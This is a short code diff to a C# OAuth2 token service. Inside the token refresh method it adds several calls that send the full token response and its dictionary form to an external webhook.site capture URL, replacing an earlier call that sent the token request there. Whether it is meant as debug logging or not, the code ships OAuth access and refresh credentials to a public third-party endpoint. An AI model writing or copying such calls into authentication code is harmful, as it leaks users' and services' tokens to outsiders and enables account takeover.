@@ -61,8 +61,11 @@ public class OAuth2TokenService(InvocationContext invocationContext)
 
             var tokenResponse = await ExecuteTokenRequestAsync(request, tokenUrl, cancellationToken);
             LogInfo($"Token refreshed successfully, expires at: {tokenResponse.ExpiresAt:O}");
-            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", request);
-            
+            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", "[RefreshToken] Token response");
+            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", tokenResponse);
+
+            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", "tokenResponse dictionary"); 
+            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", tokenResponse.ToDictionary());
             return tokenResponse.ToDictionary();
         }
         catch (Exception e)
